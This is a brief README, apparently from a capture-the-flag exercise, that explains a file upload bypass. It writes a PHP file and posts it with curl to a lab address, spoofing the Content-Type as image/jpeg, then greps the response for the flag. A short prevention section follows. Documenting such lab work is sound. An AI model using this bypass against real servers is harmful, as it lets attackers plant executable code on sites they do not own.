# File Upload Vulnerability.md

This README describes a file upload vulnerability where a PHP file is uploaded under the guise of an image. The exploit involves creating a PHP script (`/tmp/bad.php`) with the content `<?php echo "This is a poor upload check..." ?>`. This file is then uploaded using `curl` with the 'Content-Type' header set as 'image/jpeg' to bypass security checks. The command used is:
```bash
echo '<?php echo "This is a poor upload check..." ?>' > /tmp/bad.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" "http://192.168.1.15/index.php?page=upload" | grep flag
```
This command uploads the PHP file and searches for the word 'flag' in the response, useful for capturing the flag in cybersecurity exercises.

## Prevention

Enhance security by not solely trusting 'Content-Type' headers, renaming files, restricting file types, and checking file sizes and permissions.